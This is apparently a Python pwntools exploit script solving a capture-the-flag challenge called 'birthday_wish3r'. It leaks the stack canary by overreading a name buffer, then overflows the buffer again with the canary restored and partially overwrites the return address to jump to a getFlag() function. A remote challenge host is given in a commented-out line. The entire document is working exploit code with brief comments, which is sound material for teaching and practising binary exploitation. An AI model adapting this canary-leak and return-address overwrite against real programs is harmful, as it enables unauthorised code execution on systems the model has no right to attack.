#! /bin/python3

from pwn import *

p = process('./birthday_wish3r')
# p = remote('159.65.158.51',2228)

'''
In this challenge stack canary is present but getPresent function is being called repeatedly and same stack canary value will be stored in stack
So if we can leak the canary and use that value along with the exploit we can call getFlag()

PIE is turned off in the binary, so we know the exact address of the getFlag()
'''

p.recvuntil(b"Enter the length of the name: ")
p.sendline(b'105')
p.recvuntil(b'Enter the name of the person: ')
p.sendline(b'a'*100+b'b'*5) #It takes 104 bytes to reach canary and first byte of canary is null. So we are filling 105 bytes to leak canary
p.recvuntil(b'aaaaabbbbb')
canary = p.recvuntil(b'Want to wish')[:7] # 7 bytes canary (first byte is null)

p.recvuntil(b'Enter 1 to continue: ')
p.sendline(b'1')
p.recvuntil(b'Enter the length of the name: ')
p.sendline(b'200')
p.recvuntil(b'Enter the name of the person: ')

payload = b'a'*104                          # filling the buffer
payload += '\x00'.encode('ascii')+canary    # canary
payload += b'b'*8                           # overwriting saved rbp
payload += '\x56\x12'.encode('ascii')       # last two bytes of address of getFlag(), other bytes of address remains the same
p.send(payload)
p.sendline(b'2')
print(p.recvall().decode()) 
